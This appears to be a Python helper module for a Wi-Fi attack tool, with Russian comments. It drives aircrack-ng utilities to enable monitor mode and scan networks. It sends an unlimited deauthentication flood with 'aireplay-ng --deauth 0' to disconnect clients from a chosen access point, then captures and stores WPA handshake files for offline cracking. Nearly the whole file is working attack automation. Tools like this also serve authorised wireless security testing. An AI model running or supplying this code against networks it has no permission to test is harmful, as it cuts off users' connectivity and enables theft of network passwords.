import subprocess
import shutil
import os
import glob
from termcolor import colored
from menu_utils import main_menu


# Определение сетевых карт (1)
def get_network_interfaces():
    result = subprocess.run(['iwconfig'], capture_output=True, text=True)
    output_lines = result.stdout.splitlines()
    interfaces = []

    for line in output_lines:
        if line.strip().startswith('w'):
            interface = line.split()[0]
            interfaces.append(interface)

    return interfaces


# Вкл (2)
def enable_monitor_mode(interface):
    subprocess.run(['airmon-ng', 'start', interface])


# Выкл (3)
def disable_monitor_mode(interface):
    subprocess.run(['airmon-ng', 'stop', interface])


# Поиск сетей (5)
def search_networks(interface):
    try:
        subprocess.run(["airodump-ng", interface], check=True)
    except subprocess.CalledProcessError:
        print("Процесс поиска сетей прерван.")
    except KeyboardInterrupt:
        print("Поиск сетей прерван.")
    input(colored("Нажмите Enter, чтобы продолжить...", "green"))
    main_menu()


# Выбор сетей
def select_network(interface, bssid):
    subprocess.run(["airodump-ng", "--bssid", bssid, interface])


# Отключение клиентов
def deauthenticate_clients(interface, bssid, capture_event):
    capture_event.wait()
    subprocess.run(["aireplay-ng", "--deauth", "0", "-a", bssid, interface])


# Захват хэндшейка (6)
def capture_handshake(interface, bssid, channel, path, filename, capture_event):
    cmd = [
        "airodump-ng",
        "--bssid",
        bssid,
        "--channel",
        channel,
        "-w",
        os.path.join(path, filename),
        interface
    ]
    subprocess.run(cmd)

    try:
        while True:
            choice = input("Введите 's' для остановки захвата хэндшейка и перехода в главное меню: ")
            if choice.lower() == "s":
                break
    except KeyboardInterrupt:
        pass

    subprocess.run(["pkill", "airodump-ng"])

    # Проверяем успешный захват хэндшейка
    handshake_file = os.path.join(path, f"{filename}-01.cap")
    if os.path.exists(handshake_file):
        print("Захват хэндшейка завершен!")
        # Устанавливаем событие, чтобы указать, что начался захват хэндшейка
        capture_event.set()
    else:
        print("Не удалось захватить хэндшейк.")
        main_menu()


# Чистка хэндшейка
def clean_handshake():
    file_pattern = "capture-*.cap"
    files = glob.glob(file_pattern)
    for file in files:
        os.remove(file)
    print(colored("Хэндшейк очищен.", "green"))


# Сохранение хэндшейка
def save_handshake(path):
    file_pattern = "capture-*.cap"
    files = glob.glob(file_pattern)
    for file in files:
        shutil.move(file, path)
    print(colored(f"Хэндшейк сохранен по пути: {path}", "green"))


# Обновление интерфейсов и их названий
def update_interfaces():
    subprocess.run(["udevadm", "trigger", "--subsystem-match=net", "--action=add"])
    print(colored("Интерфейсы обновлены.", "green"))


# Определение сетевой карты автоматически
def auto_detect_network_card():
    interfaces = get_network_interfaces()
    if len(interfaces) > 0:
        return interfaces[0]
    else:
        print(colored("Сетевая карта не найдена.", "red"))
        return None


# Выбор сетевой карты
def choose_network_card():
    interfaces = get_network_interfaces()
    print("Доступные сетевые карты:")
    for i, interface in enumerate(interfaces):
        print(f"{i + 1}. {interface}")
    choice = input(colored("Введите номер сетевой карты: ", "green"))
    try:
        choice = int(choice)
        if 1 <= choice <= len(interfaces):
            return interfaces[choice - 1]
        else:
            print(colored("Неверный выбор.", "red"))
    except ValueError:
        print(colored("Неверный выбор.", "red"))

